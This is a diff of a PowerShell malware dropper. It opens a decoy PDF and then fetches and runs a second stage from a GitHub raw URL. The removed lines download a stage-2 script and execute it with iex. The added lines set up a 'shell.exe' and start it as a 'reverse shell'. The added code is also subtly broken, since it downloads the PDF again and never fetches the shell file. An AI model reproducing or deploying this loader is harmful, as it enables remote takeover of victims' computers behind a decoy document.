@@ -8,8 +8,13 @@ Invoke-WebRequest -Uri $PdfUrl -OutFile $OutputPath
 # Open the downloaded PDF
 Start-Process -FilePath $OutputPath
 
-# Download stage 2
-$pl = iwr https://raw.githubusercontent.com/matteoporfi/tokens/refs/heads/main/demo_shell_64.ps1
+# Define the URL and output file path
+$ShellUrl = "https://raw.githubusercontent.com/matteoporfi/tokens/refs/heads/main/shell.exe" 
+$ShellOutputPath = "$env:TEMP\shell.exe"
 
-# Execute Stage 2
-iex $pl
+# Download the PDF
+Invoke-WebRequest -Uri $PdfUrl -OutFile $OutputPath
+
+# Execute the reverse shell
+Start-Process -FilePath $ShellOutputPath
+
